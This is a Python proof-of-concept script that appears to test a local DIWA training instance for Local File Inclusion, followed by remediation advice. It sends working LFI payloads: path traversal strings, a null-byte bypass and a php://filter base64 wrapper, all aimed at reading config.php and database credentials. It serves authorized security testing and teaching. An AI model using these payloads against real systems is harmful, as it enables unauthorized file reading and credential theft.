#!/usr/bin/env python3
"""
Stage 2 POC: Local File Inclusion (LFI) via Page Parameter
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: index.php concatenates $_GET['page'] into include() path without validation
"""

import requests
import sys
import urllib.parse

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_lfi_page_inclusion():
    """
    Attempt path traversal and arbitrary file inclusion via 'page' parameter.
    Payload: ../../config.php (to read configuration)
    Expected: Contents of config.php leaked (contains database path, hashing algo, etc.)
    """
    print("[*] Testing Local File Inclusion via Page Parameter...")
    
    try:
        # Try to read config.php via path traversal
        payloads = [
            'includes/config',  # Try relative path
            '../../config',     # Try traversal
            '../config',        # Fewer levels
            'config',           # Direct if in includes
        ]
        
        for payload in payloads:
            url = f"{TARGET}/?page={urllib.parse.quote(payload)}"
            resp = SESSION.get(url)
            
            # Check if config content leaked
            if 'database' in resp.text.lower() or '$config' in resp.text or 'hashing_algorithm' in resp.text:
                print(f"✅ VULNERABLE: Config file included via payload '{payload}'")
                return True
            
            # Check for database password in response
            if 'password' in resp.text and 'database' in resp.text.lower():
                print(f"✅ VULNERABLE: Database credentials exposed via LFI")
                return True
        
        # Try null byte injection (older PHP)
        url = f"{TARGET}/?page={urllib.parse.quote('includes/config%00')}"
        resp = SESSION.get(url)
        if '$config' in resp.text or 'database' in resp.text.lower():
            print("✅ VULNERABLE: Null byte LFI bypass successful")
            return True
        
        # Try reading .php files with filter encoding
        url = f"{TARGET}/?page=php://filter/convert.base64-encode/resource=includes/config"
        resp = SESSION.get(url)
        if len(resp.text) > 100 or 'PD9w' in resp.text:  # PD9w = base64 for "<?p"
            print("✅ VULNERABLE: PHP filter wrapper allows file reading")
            return True
        
        print("❌ NOT REPRODUCIBLE: LFI protection is in place")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_lfi_page_inclusion()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Use a whitelist of allowed pages instead of dynamic inclusion:

  $allowed_pages = ['home', 'login', 'register', 'board', 'thread', 'upload', 'downloads'];
  
  $content = isset($_GET['page']) ? $_GET['page'] : 'home';
  
  // Whitelist validation
  if (!in_array($content, $allowed_pages, true)) {
      $content = '404';
  }
  
  $contentFile = CONTENT_PATH . '/' . $content . '.php';
  
  // Double-check file exists in expected directory
  if (file_exists($contentFile)) {
      require_once $contentFile;
  } else {
      require_once CONTENT_PATH . '/404.php';
  }

Key points:
- Use whitelist of known, safe page names
- Never use user input directly in include paths
- Validate after normalization (realpath)
- Use is_file() and verify directory boundaries
- Avoid wrapper protocols (php://, file://, data://)
- Disable PHP wrappers in php.ini if possible
"""
